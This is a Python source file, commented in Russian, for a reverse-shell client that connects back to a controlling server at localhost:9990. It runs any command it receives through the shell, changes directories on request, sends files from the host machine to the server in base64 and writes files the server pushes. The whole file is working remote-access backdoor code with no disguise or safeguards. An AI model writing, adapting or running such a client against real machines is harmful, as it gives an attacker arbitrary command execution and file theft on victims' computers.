import os
import socket 
import subprocess
from typing import List
import base64

client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
client_socket.connect(("localhost", 9990))                                      #Настройка и подключение к серверу
print("Success connect")

def download_from_client(command):                                          #Скачивание с клиента
    _, _, filepath, _ = command.split()
    try:
        with open(filepath, "+rb") as file:
            file=base64.b64encode(file.read())                                      #Получаем закодированное содержимое файла
        client_socket.send(file)                                                    #Отправление содержимого файла серверу
    except(Exception) as e:
        message = f"Error: {e}"
        client_socket.send(message.encode())

def download_from_server(command):                                          #Скачивание с сервера
    _, newpath = command.split(' ')
    path=newpath.split('/')
    n=len(path)
    pathdir:str = ""
    for i in range(n-1):
        pathdir=pathdir+path[i]+"/"
    file = client_socket.recv(1572864)                                          #Получаем путь к для файла и закодированное содержимое файла
    if not os.path.exists(pathdir):
        os.makedirs(pathdir)
    try:
        with open((newpath),"wb") as output_file:
            output_file.write(base64.b64decode(file))                               #Создание файла и заполнение декодированным содержимым файла
        client_socket.send(f"Файл скачен на компьютер по пути {newpath}".encode())  #Отправка результата операции серверу
    except(Exception) as e:
        message = f"Error: {e}"
        client_socket.send(message.encode())

def cd_command(command):                                                    #Команда по смене текущей директории
    # cd /home/user/test
    list_command = command.split(' ')
    os.chdir(list_command[1])                                                   #Выполнение в терминале перехода в другую директорию
    client_socket.send(f"Change directory on {list_command[1]}".encode())       #Вывод результата операции серверу
    
def interact_console():                                                     #Взаимодействие с консолью
    while True:
        command = client_socket.recv(1024).decode()                                 #Получение команды от сервера
        try:
            if "cd" in command:
                cd_command(command)                                                 #CD-команда
            elif "dl" in command:
                if "-b" in command:
                    download_from_client(command)                                   #Скачивание с клиента
                else:
                    download_from_server(command)                                   #Скачивание с сервера
            else:
                ex = subprocess.check_output(command, shell=True).decode()          #Обычная терминал команда
                if not ex:
                    client_socket.send(b"\n")                                       #Если терминал ничего не вывел
                else:
                    client_socket.send(ex.encode())                                 #Передача сообщения от терминала на сервер
        except subprocess.CalledProcessError:
            client_socket.send("Not found command\n".encode())                      #Если заданная команда отсутсвует

interact_console()